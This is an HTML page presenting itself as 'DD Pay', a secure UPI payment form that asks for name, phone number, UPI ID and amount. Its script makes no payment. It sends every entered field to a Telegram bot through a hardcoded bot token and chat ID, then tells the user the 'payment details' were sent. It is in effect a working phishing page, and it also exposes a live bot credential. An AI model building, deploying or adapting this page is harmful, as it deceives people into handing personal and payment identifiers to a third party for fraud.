<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DD Pay</title>
<script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black min-h-screen flex items-center justify-center p-4">
<div class="absolute inset-0 bg-[radial-gradient(circle_at_50%_0%,rgba(120,120,120,0.18),transparent_60%)]"></div>
<div class="w-full max-w-[420px] relative z-10">
<div class="bg-zinc-900/90 backdrop-blur-xl border border-zinc-800 rounded-[32px] p-8 shadow-2xl">
<div class="flex items-center justify-between mb-2">
<h1 class="text-[28px] font-black text-white">DD PAY</h1>
<span class="text-[11px] font-bold bg-green-500/15 text-green-400 border border-green-500/20 px-3 py-1 rounded-full">● LIVE</span>
</div>
<p class="text-zinc-500 text-[13px] mb-7">Fast • Secure • Instant Payment</p>
<form id="ddForm" class="space-y-4">
<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">Full Name</label><input name="Name" required placeholder="Enter your name" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-3.5 text-white"></div>
<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">Phone Number</label><input name="Phone" required placeholder="98765 43210" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-3.5 text-white"></div>
<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">UPI ID</label><input name="UPI" required placeholder="yourname@upi" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl px-4 py-3.5 text-white"></div>
<div><label class="text-[11px] font-semibold tracking-widest text-zinc-400 uppercase mb-2 block">Amount</label><div class="relative"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-500 font-bold">₹</span><input name="Amount" required placeholder="500" class="w-full bg-zinc-800 border border-zinc-700 rounded-xl pl-8 pr-4 py-3.5 text-white"></div></div>
<button id="btn" type="submit" class="w-full bg-white text-black font-bold rounded-xl py-4 mt-2">Pay Now</button>
</form>
<p id="msg" class="text-center text-[13px] mt-4"></p>
<div class="text-center mt-6 text-[11px] text-zinc-600">🔒 Secure payment powered by UPI</div>
</div>
</div>
<script>
document.getElementById('ddForm').addEventListener('submit', async (e)=>{
e.preventDefault();
const btn=document.getElementById('btn'); const msg=document.getElementById('msg');
btn.textContent='Sending...'; btn.disabled=true;
let text=`🔥 DD Pay - Nayi Entry!\n\n`;
const fd=new FormData(e.target);
for(let [k,v] of fd.entries()) text+=`${k}: ${v}\n`;
text+=`\nTime: ${new Date().toLocaleString('en-IN')}`;
await fetch('https://api.telegram.org/bot8606684305:AAF5P-iR60pafefJwJ187neRGBhHsUWbuqs/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'7344589159',text:text})});
msg.textContent='✅ Payment details sent!'; msg.className='text-center text-green-400 text-[13px] mt-4';
e.target.reset(); btn.textContent='Pay Now'; btn.disabled=false;
});
</script>
</body>
</html>
